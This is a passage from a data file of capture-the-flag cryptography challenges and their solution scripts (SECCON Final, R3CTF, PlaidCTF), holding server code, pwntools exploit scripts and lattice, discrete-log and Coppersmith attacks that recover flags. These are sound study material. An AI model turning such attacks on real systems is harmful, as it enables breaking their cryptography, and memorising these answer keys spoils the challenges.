Hololive san-kisei no Usada Pekora-peko! domo, domo!\",\n    \"Bun bun cha! Bun bun cha!\",\n    \"kitira!\",\n    \"usopeko deshou\",\n    \"HAâ†‘HAâ†‘HAâ†“HAâ†“HAâ†“\",\n    \"HAâ†‘HAâ†‘HAâ†‘HAâ†‘\",\n    \"it's me pekora!\",\n    \"ok peko\",\n]\n\nprint(\"Konpeko!\")\nprint(\"watashi no public key: %s\" % P)\n\nwhile True:\n    try:\n        print(\"nani wo shitai desuka?\")\n        print(\"1. Start a Diffie-Hellman key exchange\")\n        print(\"2. Get an encrypted flag\")\n        print(\"3. Exit\")\n        option = int(input(\"> \"))\n        if option == 1:\n            print(\"Public key wo kudasai!\")\n            x = int(input(\"x: \"))\n            y = int(input(\"y: \"))\n            S = Point(E, x, y) * d\n            print(encrypt(S, choice(quotes).encode()).hex())\n        elif option == 2:\n            r = randbelow(n)\n            C1 = r * G\n            C2 = encrypt(r * P, flag)\n            print(point_to_bytes(C1).hex())\n            print(C2.hex())\n        elif option == 3:\n            print(\"otsupeko!\")\n            break\n        print()\n    except Exception as ex:\n        print(\"kusa peko\")\n        print(ex)\n        break\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\SECCON-Final\\DLP+\\exp.py", "category": "crypto", "solution_code": "from Crypto.Util.number import isPrime\nfrom sage.all import factor, GF, discrete_log, PolynomialRing\nfrom pwn import remote, process\n\n\np = 15716184699547462800461771601028927135348272154927459012381834606394607906735138215326765472045739095867667862791827281627279676331280673025582786492800565034681474589962543612181570816917654358007798115791387579073196284235251797321810838517520967959561184040912976519718458581462926905245885178079360322053716674233519451182638293301601\nk = 1125\nsmooth_order = 81702288101897374130672874598561902721173468294968431566564038710852096398047085617569136205194590591076494888575280919059927276469484223384374847874938192122852470746278712759413600\nmax_pf = 40396092614384641\nsmooth_order //= max_pf\nT = (p-1) // smooth_order\n\nassert isPrime(p)\nassert (2**k - 3) % p == 0\nassert (p-1) % smooth_order == 0\ng = p // 2\nh = p // 3\nassert g**k % p == h % p\nimport time \nst = time.time()\nlocal = True\nif local:\n    io = process([\"python3\", \"server.py\"])\nelse:\n    io = remote(\"xxxx\", 0000)\n    \nio.sendlineafter(b\"> \", hex(p).encode())\nr = int(io.recvline().strip().split(b\" = \")[1])\npr = PolynomialRing(GF(p), 'x')\nFp = GF(p)\nv = pr.gen()\nfx = v + v**k - r\nrs = fx.roots()\nfor r_m in rs:\n    root = r_m[0]\n    try:\n        print(\"Trying Discrete Log...\")\n        rx = discrete_log(Fp(root)**T, Fp(g)**T, ord=smooth_order)\n    except:\n        print(\"Discrete Log Failed\")\n        continue\n    print(f\"Discrete Log Success: {int(rx).bit_length()}\")\n    if int(rx).bit_length() <= 512:\n        et = time.time()\n        print(f\"Time: {et - st}\")\n        io.sendlineafter(b\"> \", str(rx).encode())\n        print(io.recvline())\n        io.interactive()\n        exit()", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\SECCON-Final\\DLP+\\find_prime.py", "category": "crypto", "solution_code": "from Crypto.Util.number import isPrime\nfrom sage.all import factor, GF\nimport requests\nimport json\nimport time\n\ndef query_factor(k, a):\n    factors = requests.get(f\"https://factordb.com/api?query={2**k + a}\").json()\n    time.sleep(0.3)\n    try:\n        return factors[\"factors\"]\n    except:\n        time.sleep(1)\n        factors = requests.get(f\"https://factordb.com/api?query{2**k + a}\").json()\n        return factors[\"factors\"]\n    \ndef factordb(n):\n    factors = requests.get(f\"https://factordb.com/api?query={n}\").json()\n    time.sleep(0.3)\n    try:\n        return factors[\"factors\"]\n    except:\n        time.sleep(1)\n        factors = requests.get(f\"https://factordb.com/api?query{n}\").json()\n        return factors[\"factors\"]    \n\n\nsmoothness_B = 2**60\n\n# 1125\nfor k in range(1000, 2400):\n    factors = query_factor(k, 3 * (-1)**(k % 2))\n    for numstr, e in factors:\n        num = int(numstr)\n        if not isPrime(num):\n            continue\n        if num.bit_length() > 512:\n            facts = factordb(num - 1)\n            smooth_order = 1\n            for fact, ei in facts:\n                if int(fact) < smoothness_B:\n                    smooth_order *= int(fact) ** int(ei)\n            print(f\"{k = }, {num = }\")\n            print(f\"{smooth_order = } {smooth_order.bit_length() = }\")\n            if smooth_order.bit_length() > 512:\n                exit()", "name": "find_prime"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\SECCON-Final\\DLP+\\server.py", "category": "crypto", "solution_code": "import os\nimport signal\nfrom secrets import randbelow\n\nfrom Crypto.Util.number import isPrime\n\nflag = os.getenv(\"FLAG\", \"SECCON{this_is_not_a_flag}\")\n\n\nif __name__ == \"__main__\":\n    signal.alarm(120)\n\n    p = int(input(\"Your favorite prime (hex) > \"), 16)\n    if not isPrime(p):\n        print(\"p must be a prime\")\n        exit()\n\n    g = p // 2\n    h = p // 3\n    x = randbelow(2**512)\n    r = (pow(g, x, p) + pow(h, x, p)) % p\n    print(f\"{r = }\")\n\n    guess_x = int(input(\"Guess x > \"))\n    if x == guess_x:\n        print(flag)\n    else:\n        print(\"Wrong...\")\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\SECCON-Final\\hell_summon\\exp.py", "category": "crypto", "solution_code": "from sage.all import matrix, ZZ, lcm, gcd\nfrom random import randint\nfrom Crypto.Util.number import getPrime\nfrom pwn import remote, process\nfrom sage.all import PolynomialRing, GF, Zmod, ZZ, matrix, QQ\nfrom ast import literal_eval\nfrom Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes\nfrom Crypto.Util.strxor import strxor\nlocal = True\nchunk_size = 5\n\nif local:\n    io = process(['python3', 'server.py'])\nelse:\n    # hell-summon.int.seccon.games 8888\n    io = remote('hell-summon.int.seccon.games', 8888)\n\ndef encrypt(message,priv):\n    p,r,H = priv\n    assert len(message) % 5 == 0\n\n    message_chunks = [message[i:i + chunk_size] for i in range(0, len(message), chunk_size)]\n\n    ciphertext = b\"\"\n    mac = 0\n    for chunk in message_chunks:\n        temp = strxor(chunk, H)\n        mac = (r*(mac + bytes_to_long(temp))) % p\n        ciphertext += temp\n\n    return ciphertext, long_to_bytes(mac)\n\ndef decrypt(ciphertext, mac, priv):\n    mac = bytes_to_long(mac)\n    p,r,H = priv\n    ciphertext_chunks = [ciphertext[i:i + chunk_size] for i in range(0, len(ciphertext), chunk_size)]\n\n    message = b\"\"\n    expected_mac = 0\n    for chunk in ciphertext_chunks:\n        expected_mac = (r*(expected_mac + bytes_to_long(chunk))) % p\n        message += strxor(chunk, H)\n    if mac == expected_mac:\n        return message\n    else:\n        return None\n\ndef initialize(io:remote):\n    io.recvuntil(b\"p=\")\n    p = int(io.recvline().strip().decode())\n    io.recvuntil(b\"messages=\")\n    ms = literal_eval(io.recvline().strip().decode())\n    io.recvuntil(b\"truncated_macs=\")\n    ts = literal_eval(io.recvline().strip().decode())\n    return p, ms, ts\n\ndef hnp_sum_solver(a, q, E, T):\n    \"\"\"\n    Solves the HNP-SUM problem for a given lattice leaks a, modulus q, error bound E, and target bound T.\n    hnp sum sample :    a_i + e_i = t_i * x \\mod q \n    where x is the secret, e_i <= E, t_i <= T, and x is the fixed secret.\n\n    Args:\n        a (list[ZZ]): The leaks information of HNP-SUM problem.\n        q (ZZ): The modulus of the HNP-SUM problem. \n        E (ZZ): The error bound of the HNP-SUM problem. \n        T (ZZ): The target bound of the HNP-SUM problem.\n\n    Returns:\n        list[ZZ]: The solution of the HNP-SUM problem : [t_1, t_2, ..., t_n]\n    \"\"\"\n    n = len(a)\n    M = matrix(ZZ, n + 1, n + 1)\n    for i in range(n):\n        M[i,n] = a[i]\n        M[i, i] = 2*E\n    M[n, n] = q\n    B = M.LLL()\n    \n    new_E = max(E, T)\n    sub_lattice = B[:(n-1),:n] / (2*E) * (2*new_E)\n    sub_lattice[:, 0] /= (2 * new_E)\n    t0 = None\n    t0s = []\n    ts = []\n    for i in range(1, n):\n        sub_lattice[:,i] /= (2 * new_E)\n        sub_lattice = sub_lattice.LLL()\n        ti, t0_alt = sub_lattice[0,0], -sub_lattice[0,i]\n        if t0_alt < 0:\n            t0_alt, ti = -t0_alt, -ti\n        t0s.append(t0_alt)\n        ts.append(ti)\n        sub_lattice[:,i] *= (2 * new_E)\n    t0 = lcm(t0s)\n    assert t0 < T\n    rts = [ZZ(t0)]\n    for ti, _t0 in zip(ts, t0s):\n        rts.append(ZZ(ti * (t0 // _t0)))\n    return rts         \n\np, ms, ts = initialize(io)\nms = [bytes_to_long(bytes.fromhex(m)) for m in ms]\n# ts = [bytes_to_long(bytes.fromhex(t)) for t in ts]\nts = [bytes_to_long(bytes.fromhex(t) + b\"\\x00\\x00\") for t in ts]\np = ZZ(p)\nT = 2**40\nE = 2**16\nmhs = hnp_sum_solver(ts, p, E, T)\nprint(mhs)\nmhs_bits = [mh.nbits() for mh in mhs]\nH = mhs[0] ^ ms[0]\nassert H == mhs[1] ^ ms[1], \"H is not same\"\nprint(f\"{H = }\")\nn = len(ms)\nM = matrix(QQ, n + 2, n + 2)\nfor i in range(n):\n    M[0, i] = mhs[i]\n    M[1, i] = -ts[i]\n    M[i + 2, i] = p\nM[0, n] = ZZ(E) / ZZ(p)\nM[1, n + 1] = ZZ(1) / p\nM = M.LLL()\nfor row in M:\n    if row[:n] == 0:\n        continue\n    if all([ZZ(r) < E for r in row[:n]]):\n        row_nbits = [ZZ(r).nbits() for r in row[:n]]\n        print(row_nbits)\n        sym = row[n+1] * p\n        assert sym == 1 or sym == -1\n        r = row[n]/(ZZ(E)/ZZ(p)) * sym % p\n        print(f\"{r = }\")\n        break\n\nmsg = b\"Kurenaif,gimme flag!\"\nc, mac = encrypt(msg, (p, r, long_to_bytes(H)))\npriv = (p, r, long_to_bytes(H, 5))\nassert decrypt(c, mac, priv) == msg\nio.sendlineafter(b\"ciphertext:\", c.hex().encode())\nio.sendlineafter(b\"mac:\", mac.hex().encode())\nio.interactive()\n", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\SECCON-Final\\hell_summon\\server.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes\nfrom Crypto.Util.strxor import strxor\nimport os\nimport signal\n\nFLAG = os.getenv('FLAG', 'SECCON{dummy}')\n\nchunk_size = 5\n\ndef gen_key():\n    p = getPrime(64)\n    r = bytes_to_long(os.urandom(8))\n    H = os.urandom(5)\n    pub = p\n    priv = (p,r,H)\n    return pub, priv\n\ndef encrypt(message,priv):\n    p,r,H = priv\n    assert len(message) % 5 == 0\n\n    message_chunks = [message[i:i + chunk_size] for i in range(0, len(message), chunk_size)]\n\n    ciphertext = b\"\"\n    mac = 0\n    for chunk in message_chunks:\n        temp = strxor(chunk, H)\n        mac = (r*(mac + bytes_to_long(temp))) % p\n        ciphertext += temp\n\n    return ciphertext, long_to_bytes(mac)\n\ndef decrypt(ciphertext, mac, priv):\n    mac = bytes_to_long(mac)\n    p,r,H = priv\n    ciphertext_chunks = [ciphertext[i:i + chunk_size] for i in range(0, len(ciphertext), chunk_size)]\n\n    message = b\"\"\n    expected_mac = 0\n    for chunk in ciphertext_chunks:\n        expected_mac = (r*(expected_mac + bytes_to_long(chunk))) % p\n        message += strxor(chunk, H)\n    if mac == expected_mac:\n        return message\n    else:\n        return None\n    \ndef main():\n    signal.alarm(120)\n    p, priv = gen_key()\n    print(f\"{p=}\")\n    messages = []\n    truncated_macs = []\n    for i in range(42):\n        message = os.urandom(5)\n        _, mac = encrypt(message, priv)\n        messages.append(message.hex())\n        truncated_macs.append(mac[:-2].hex())\n    print(f\"{messages=}\")\n    print(f\"{truncated_macs=}\")\n\n    c = bytes.fromhex(input(\"ciphertext:\"))\n    mac = bytes.fromhex(input(\"mac:\"))\n    return decrypt(c, mac, priv) == b\"Kurenaif,gimme flag!\"\n\nif main():\n    print(FLAG)", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\SECCON-Final\\RSA+\\exp.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getPrime, inverse, GCD, isPrime\nfrom secrets import randbelow\nfrom sage.all import GF, PolynomialRing, ZZ\nfrom pwn import remote, process\nfrom binascii import hexlify\n\nlocal = True\nif local:\n    io = process([\"python3\", \"server.py\"])\nelse:\n    io = remote(\"xxxx\", 0000)\n\ndef gen_primes():\n    while True:\n        p = getPrime(600)\n        if (p - 1) % 5 == 0:\n            continue\n        q = (p - 1) + 5\n        while not isPrime(q):\n            q += (p - 1)\n        n = p * q\n        g = n // 2\n        h = n // 3\n        print(f\"{n % 3 = }\")\n        if n % 3 == 1:\n            continue\n        assert g % (p - 1) == 2 * h % (p - 1), f\"check failed {g % (p - 1) = } {2 * h % (p - 1) = }\"\n        if GCD(h, p - 1) == 1:\n            return p, q, n, g, h\n    \np = 4129284477590436975462058159058751496879426225711950616980857659361882287013015292465345440422805246254285575567450139982507288890140003006065321543054455848218275927631925064815949\nq = 202334939401931411797640849793878823347091885059885580232062025308732232063637749330801926580717457066459993202805056859142857155616860147297200755609668336562695520453964328175981457\nn = 835498524546597072205468227827551320095259169463425461421252753303849037443904202362979781960871385411757105437115885901675398396323561024831817748064041886740682059237056708981535833538740924495001897639935652615615405058988267951981122905894748005264313472657846444947603925230706964138489599835526957209087872258057239049146215356134672016701464088402141857693\ng = 417749262273298536102734113913775660047629584731712730710626376651924518721952101181489890980435692705878552718557942950837699198161780512415908874032020943370341029618528354490767916769370462247500948819967826307807702529494133975990561452947374002632156736328923222473801962615353482069244799917763478604543936129028619524573107678067336008350732044201070928846\nh = 278499508182199024068489409275850440031753056487808487140417584434616345814634734120993260653623795137252368479038628633891799465441187008277272582688013962246894019745685569660511944512913641498333965879978550871871801686329422650660374301964916001754771157552615481649201308410235654712829866611842319069695957419352413016382071785378224005567154696134047285897\n\n\nio.sendlineafter(b\"> \", hex(p).encode())\nio.sendlineafter(b\"> \", hex(q).encode()) \nr = int(io.recvline().split(b\" = \")[1])\npr = PolynomialRing(GF(p), 'x')\nv = pr.gen()\nfx =  v + v**2 - r\nrs = fx.roots()\ndh = inverse(h, p - 1)\nxs = [pow(r[0], dh, p) for r in rs]\nrx = None\nfor xi in xs:\n    if int(xi).bit_length() <= 512:\n        rx = xi\n        break\nassert rx is not None\nio.sendlineafter(b\"> \", str(rx).encode())\nio.interactive()\n", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\SECCON-Final\\RSA+\\server.py", "category": "crypto", "solution_code": "import os\nimport signal\nfrom secrets import randbelow\n\nfrom Crypto.Util.number import isPrime\n\nflag = os.getenv(\"FLAG\", \"SECCON{this_is_not_a_flag}\")\n\n\nif __name__ == \"__main__\":\n    signal.alarm(120)\n\n    p = int(input(\"Your favorite prime p (hex) > \"), 16)\n    if not isPrime(p) and p.bit_length() >= 512:\n        print(\"p must be a prime\")\n        exit()\n    q = int(input(\"Your favorite prime q (hex) > \"), 16)\n    if not isPrime(q) and q.bit_length() >= 512:\n        print(\"q must be a prime\")\n        exit()\n    n = p * q\n\n    g = n // 2\n    h = n // 3\n    x = randbelow(2**512)\n    r = (pow(x, g, n) + pow(x, h, n)) % n\n    print(f\"{r = }\")\n\n    guess_x = int(input(\"Guess x > \"))\n    if x == guess_x:\n        print(flag)\n    else:\n        print(\"Wrong...\")\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\R3CTF\\r3tauq\\dlp.py", "category": "crypto", "solution_code": "from sage.all import QuaternionAlgebra, Zmod, matrix, vector, ZZ, is_prime, PolynomialRing, GF, discrete_log, crt, Integer, lcm\nfrom sage.modules.free_module_integer import IntegerLattice\nfrom math import gcd\nfrom sage.all import var\nimport random\n\ndata = [9179146701312781699176828536776206089522408831979885137804817119605132824670673896777591947510882312771183820299882701673215709151977703193903616420702637,\n        188706257709485662889897107268939642280152413424908152855562194130538159229344166143895172825675717408926036013540426973122050052311570664470631060866326,\n        2682712522093551545327045002884555242296600010649692520986985330242254238488174707977608269114146421801908861117953931511928486194314901772151783668459458,\n        3450486865638869884029607240891787866556930082379406388731244160308196118526545881858756124529382085993846169512275853780392762817972043910244447967967496,\n        3978613946907291563196945341686358146709099241100401211979238259502207240204268447607153317575767659025152104242438128290935255838611081957683034411586841,\n        'fb459084099c44b75f2a1c256b604b187ab4877e78ea2b9fc5320471c319f9063428c72002310df82e1a424425189d0dabebe601031a']\n\nn = data[0]\nquater_elem = data[1:5]\nciphertext = data[5]\n\nr = 74894385846710556044104011882125496960046611255536111648508533082603964330861\np = 91109511933071554201802903795701989021612569628964539259899050592358431892241\nq = 100748500420633602436909572573651942923829948109715215298913760623104145908957\nx = 26111235826389281409921206631160868195531041229246816708189517548794591270391590598506678037519453384408563443564544\ny = 24759073387322890531475974179418283533319728990974857112961421713284938654520449858486190319612120977056990626840576\n\nqr_p = QuaternionAlgebra(GF(p), -x, -y)\nqr_q = QuaternionAlgebra(GF(q), -x, -y)\norder_p = qr_p.order()\norder_q = qr_q.order()\ng = [x+y, p + x, q + y, r]\ng_p = qr_p(g)\ng_q = qr_q(g)\n# gp_order = g_p.order()\n# gq_order = g_q.order()\nunits = [1, x, y, x*y]\n\nquater_abs = lambda a: sum(int(ai)**2 * ui for ai, ui in zip(a, units))\nprint(f\"Order of gp in p: {order_p == p**4}\")\nprint(f\"Order of gq in q: {order_q == q**4}\")\nabs_gp = quater_abs(g_p) % p\nabs_gq = quater_abs(g_q) % q\ne = random.randint(1, p-1)\nyp = g_p**e\nyq = g_q**e\nabs_yp = quater_abs(yp)\nabs_yq = quater_abs(yq)\nprint(f\"Check power in gp {pow(abs_gp, e, p) == abs_yp % p}\")\nprint(f\"Check power in gq {pow(abs_gq, e, q) == abs_yq % q}\")\n\n# our dlogs \nabs_yp = quater_abs(quater_elem) % p\nabs_yq = quater_abs(quater_elem) % q\nprint(f\"Dlog in Fp with {p = }\")\nprint(f\"y = {abs_yp}\")\nprint(f\"g = {abs_gp}\")\n\nprint(f\"Dlog in Fq with {q = }\")\nprint(f\"y = {abs_yq}\")\nprint(f\"g = {abs_gq}\")\n\n\"\"\" \nCADO-NFS LOG\n\nDlog in Fp with \np = 91109511933071554201802903795701989021612569628964539259899050592358431892241\ny = 87493889800274222582900548667009991989700049304632627564050507246257017161987\ng = 2636956959258946810191426492351640683005981563835384034375773230576168688790\np - 1 = 2**4 * 5 * 6359 * 78030424691 * 2295202126216837008978652626989273467723189905747503092156937\norder_g = 2**2 * 5 * 6359 * 78030424691 * 2295202126216837008978652626989273467723189905747503092156937\nmul_gp = 2**2 * 5 * 6359 * 78030424691\nSubdlog with order 2295202126216837008978652626989273467723189905747503092156937 in Fp = 91109511933071554201802903795701989021612569628964539259899050592358431892241\ng1 = 81344971784651093607577314604422933652934072674828789345616819048343361039697\ny1 = 24655167518040949876050790864554469951460936890795378436378947746972293994439\nInfo:root: If you want to compute one or several new target(s), run cado-nfs.py /tmp/cado.htydj3b4/p75.parameters_snapshot.0 target=<target>[,<target>,...]\nInfo:root: logbase = 22167671836546850850740289172069462914257628875581352203716045668317468574172\nInfo:root: target = 81344971784651093607577314604422933652934072674828789345616819048343361039697\nInfo:root: log(target) = 378859981840906848820957511601953517466451927471469660249099 mod ell\n378859981840906848820957511601953517466451927471469660249099\nInfo:root: logbase = 22167671836546850850740289172069462914257628875581352203716045668317468574172\nInfo:root: target = 24655167518040949876050790864554469951460936890795378436378947746972293994439\nInfo:root: log(target) = 1639226127474759620701601100250738069552656542550696361357216 mod ell\n1639226127474759620701601100250738069552656542550696361357216\nsage: dlog1 = pow(378859981840906848820957511601953517466451927471469660249099, -1, ell) * 16392261274747596207016011002\n....: 50738069552656542550696361357216 % ell\nsage: g1**dlog1 == y1\nTrue\nsage: dlog1\n1018087564301874149192086802728835194265892285834616431559369\nsage:\n\nDlog in Fq with \nq = 100748500420633602436909572573651942923829948109715215298913760623104145908957\ny = 87563080820627806380850898731860520742983266799155542576092610861968329046365\ng = 44344166210599691210046341463376129692509154685650638246452459454809589107882\nq - 1 = 2**2 * 151 * 761 * 172264199 * 12723950361497992", "name": "dlp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\R3CTF\\r3tauq\\exp.py", "category": "crypto", "solution_code": "\nfrom sage.all import QuaternionAlgebra, Zmod, matrix, vector, ZZ, is_prime, PolynomialRing\nfrom math import gcd\nfrom sage.all import var\n\ndata = [9179146701312781699176828536776206089522408831979885137804817119605132824670673896777591947510882312771183820299882701673215709151977703193903616420702637,\n        188706257709485662889897107268939642280152413424908152855562194130538159229344166143895172825675717408926036013540426973122050052311570664470631060866326,\n        2682712522093551545327045002884555242296600010649692520986985330242254238488174707977608269114146421801908861117953931511928486194314901772151783668459458,\n        3450486865638869884029607240891787866556930082379406388731244160308196118526545881858756124529382085993846169512275853780392762817972043910244447967967496,\n        3978613946907291563196945341686358146709099241100401211979238259502207240204268447607153317575767659025152104242438128290935255838611081957683034411586841,\n        'fb459084099c44b75f2a1c256b604b187ab4877e78ea2b9fc5320471c319f9063428c72002310df82e1a424425189d0dabebe601031a']\n\nn = data[0]\nquater_elem = data[1:5]\nciphertext = data[5]\n\n# def right_mul_matrix(a, b, c, d, u, v):\n#     \"\"\"\n#     i**2 = u, j**2 = v, k**2 = -u*v, i*j = -j*i\n#     \"\"\"\n#     return [\n#         [a, b * u, c * v, d * -u * v],\n#         [b, a, d*v, -c*v],\n#         [c, -u*d, a, b * u],\n#         [d, -c, b, a]\n#     ]\n# x, y = 1, 2\n# qr = QuaternionAlgebra(Zmod(n), 1, 2)\n# base = qr.random_element()\n# base_mat = matrix(Zmod(n), right_mul_matrix(base[0], base[1], base[2], base[3], x, y))\n\n# r = qr.random_element()\n# res1 = base * r\n# res2 = base_mat * vector(Zmod(n), list(r))\n# print(res1)\n# print(res2)\n# for i in range(4):\n#     assert res1[i] == res2[i], f\"Mismatch at index {i}: {res1[i]} != {res2[i]}\"\n# x, y, p, q, r = var('x y p q r')\n# base = [x+y, p+x, q+y, r]\n# mat = matrix(right_mul_matrix(*base, x, y))\n# for row in mat:\n#     print(row)\n# y = base\n# print(f\"Initial base: {y}\")\n# for i in range(1, 2):\n#     y = mat * vector(y)\n#     print(f\"Iteration {i}: {y}\")\n    \na, b, c, d = quater_elem\nmat = matrix(ZZ, [\n    [b, c, d*2**128],\n    [n, 0, 0],\n    [0, n, 0],\n    [0, 0, n*2**128]\n    ])\n\nL = mat.LLL()\n# base = [x+y, p + x, q + y, r]\n# 2**(256 + 128) = 2**384\nfor row in L:\n    row_bits = [int(x).bit_length() for x in row]\n    r0 = abs(row[-1]//2**128)\n    if is_prime(r0):\n        print(f\"Found prime: r = {r0}\")\n        print(f\"{row = }\")\n        d0 = r0\n        b0 = abs(row[0])\n        c0 = abs(row[1])\n        print(f\"{b0 = }\")\n        print(f\"{c0 = }\")\n        print(f\"{d0 = }\")\n        plsb128 = b0 % 2**128\n        qlsb128 = c0 % 2**128\n        assert plsb128 * qlsb128 % 2**128 == n % 2**128, \"Mismatch in LSBs\"\n        print(f\"find partial p leak {plsb128 = }\")\n        break\n\npr = PolynomialRing(Zmod(n), \"x\")\nx = pr.gen()\n# try lsb leak\nfor i in range(2**8):\n    p_lsb_136 = (plsb128 + i * 2**128)\n    f = x * 2**(136) + p_lsb_136\n    f = f.monic()\n    roots = f.small_roots(X=2**(256 - 136), beta = 0.499, epsilon=0.03)\n    if len(roots) >= 1:\n        ph = roots[0]\n        p = int(ph) * 2**136 + p_lsb_136\n        q = n // p\n        assert p * q == n, \"p * q does not equal n\"\n        print(f\"Found {p = }, {q = }\")\n        x = b0 - p\n        y = c0 - q\n        assert is_prime(x >> 128) and is_prime(y >> 128), \"x or y is not prime\"\n        print(f\"Found {x = }, {y = }\")\n        break\n    \nqr_p = QuaternionAlgebra(Zmod(p), -x, -y)\nqr_q = QuaternionAlgebra(Zmod(q), -x, -y)\norder_p = qr_p.order()\norder_q = qr_q.order()\ng = [x+y, p + x, q + y, r0]\ng_p = qr_p(g)\ng_q = qr_q(g)\ngp_order = g_p.multiplicative_order()\ngq_order = g_q.multiplicative_order()\nprint(f\"Order of gp in p: {gp_order}\")\nprint(f\"Order of gq in q: {gq_order}\")", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\R3CTF\\split3pig\\exp.py", "category": "crypto", "solution_code": "from sage.all import var, crt, GF, Zmod, lcm, PolynomialRing, ZZ\nfrom hashlib import sha256\n\nN = 39857078746406469131129281921490520306196739933449401384580614683236877901453146754149222509812535866333862501431453065249306959004319408436548574942416212329735258587670686655658056553446879680643872518009328886406310298097685861873954727153720761248262606469217940464611561028443119183464419610396387619860313813067179519809796028310723320608528262638653826016645983671026819244220510314301178181698134390850683834304169240632402535087021483298892547974104858755498823118164815682452718215716370727477136888839954993949013970026988378086175471190518276414200966496353144747778470590767485019943178534397845127421058830430797806265311195099187747227867325234593386438995618936934586514932401108874934000734850169069717060963988677462779177959990601405850727404268354600078746523164279\n\nE1 = 17599828213549223253832044274649684283770977196846184512551517947600728059\nE2 = 13524024408490227176018717697716068955892095093578246398907145843636542721\ne1_bit = E1.bit_length()\ne2_bit = E2.bit_length()\nE = lcm(E1, E2)\n# p - 1 = k1 * E1\n# q - 1 = k2 * E2\n# N % E1 = q^2 % E1\n# N % E2 = p % E2 \nrp = crt([1, N % E2], [E1, E2])\nrqe1_square = N % E1\nrqe1s = Zmod(E1)(rqe1_square).nth_root(2, all=True)\nprint(f\"{rqe1s = }\")\nqbit = 870\nK = 2**(qbit - e1_bit - e2_bit)\n\nfor rqe1 in rqe1s:\n    rq = crt([int(rqe1), 1], [E1, E2])\n    # p - rp = k1 * E1E2 \n    # q - rq = k2 * E1E2 \n    R = PolynomialRing(Zmod(N), \"x\")\n    x = R.gen()\n    f = (x * E1*E2 + ZZ(rq))**2\n    roots = f.monic().small_roots(X= K, epsilon = 0.05, beta = 2/3 - 0.1)\n    if len(roots) >= 1:\n        print(f\"{roots = }\")\n        k = roots[0]\n        q = int(rq) + k * E1 * E2\n        H = sha256()\n        H.update(str(q).encode())\n        print(\"r3ctf{\" + H.hexdigest() + \"}\")", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\R3CTF\\split3pig\\task.py", "category": "crypto", "solution_code": "from Crypto.Util.number import isPrime\nfrom hashlib import sha256\nfrom secret import P,Q,flag\n\nr = 2 \nN = P * Q ** r\nE1 = 17599828213549223253832044274649684283770977196846184512551517947600728059 \nE2 = 13524024408490227176018717697716068955892095093578246398907145843636542721\nassert isPrime(P)\nassert isPrime(Q)\nassert (P - 1) % E1 == 0\nassert (Q - 1) % E2 == 0\n\nH = sha256()\nH.update(str(Q).encode())\nassert flag == \"r3ctf{\" + H.hexdigest() + \"}\"\n\nprint(N)\n\"\"\"\n39857078746406469131129281921490520306196739933449401384580614683236877901453146754149222509812535866333862501431453065249306959004319408436548574942416212329735258587670686655658056553446879680643872518009328886406310298097685861873954727153720761248262606469217940464611561028443119183464419610396387619860313813067179519809796028310723320608528262638653826016645983671026819244220510314301178181698134390850683834304169240632402535087021483298892547974104858755498823118164815682452718215716370727477136888839954993949013970026988378086175471190518276414200966496353144747778470590767485019943178534397845127421058830430797806265311195099187747227867325234593386438995618936934586514932401108874934000734850169069717060963988677462779177959990601405850727404268354600078746523164279\n\"\"\"\n\n", "name": "task"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\hangman\\hash_collide.py", "category": "crypto", "solution_code": "\nimport ctypes\nfrom ctypes import c_void_p, c_ulong\nimport os\nfrom sage.all import matrix, GF, vector\nimport random\n\nmix0 = [\n    0x98, 0xE8, 0x6C, 0xF4, 0x91, 0xA7, 0xEE, 0x7B, 0xF5, 0x21, 0x63, 0x5C, 0x2C, 0x2F, 0x7C, 0xC8,\n    0x8A, 0x9F, 0x40, 0xE4, 0x60, 0xBD, 0x9B, 0xB6, 0xD6, 0x6E, 0x03, 0xE0, 0xA5, 0xAB, 0xBB, 0xA2,\n    0x70, 0xC9, 0x4A, 0x9D, 0x59, 0xF3, 0x65, 0x3E, 0x15, 0x0A, 0x0C, 0xDA, 0x06, 0xC3, 0x2B, 0x2E,\n    0xAF, 0x0F, 0x77, 0x31, 0xD3, 0x61, 0xA4, 0x19, 0x92, 0xF0, 0x68, 0x49, 0x11, 0xE1, 0x78, 0xFE,\n    0xAA, 0x08, 0x4B, 0x53, 0xC5, 0xF9, 0x79, 0xFC, 0x86, 0x55, 0x2A, 0xD8, 0x67, 0x5D, 0x50, 0x33,\n    0x72, 0x7E, 0xCA, 0xCD, 0x38, 0xA1, 0x2D, 0x25, 0x39, 0xB5, 0xCB, 0x27, 0xD4, 0x75, 0xCC, 0x89,\n    0x7A, 0x3D, 0x48, 0x32, 0x20, 0xA8, 0x0E, 0xCE, 0x52, 0xB7, 0x74, 0x1F, 0xC2, 0x82, 0x10, 0x35,\n    0x95, 0xEC, 0x7F, 0x41, 0xDC, 0x51, 0xE7, 0x99, 0x3B, 0x14, 0x3A, 0x42, 0xB0, 0xDE, 0xFD, 0xEB,\n    0x24, 0xC6, 0xE2, 0x4D, 0x64, 0x05, 0x8B, 0xC1, 0xBE, 0xFF, 0x01, 0x9E, 0xA0, 0x28, 0xEF, 0x5F,\n    0x29, 0x56, 0x6A, 0x71, 0x88, 0x7D, 0xD9, 0x94, 0x1E, 0xEA, 0x1A, 0x76, 0xB3, 0x30, 0x5B, 0x5A,\n    0xAC, 0x04, 0xB8, 0x9C, 0x8F, 0xBF, 0xFB, 0x80, 0x66, 0xD1, 0x46, 0xDD, 0x96, 0x85, 0x02, 